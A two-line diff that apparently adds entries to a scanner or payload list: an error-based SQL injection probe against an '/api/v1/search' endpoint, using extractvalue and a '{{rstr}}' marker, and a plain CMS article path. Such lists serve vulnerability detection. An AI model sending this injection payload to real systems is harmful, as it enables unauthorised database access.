@@ -1,0 +1,2 @@
+/api/v1/search?key=%27%20and%20extractvalue(1,concat(0x7e,%27{{rstr}}%27,0x7e))--%20a
+/cms/collect/getArticle
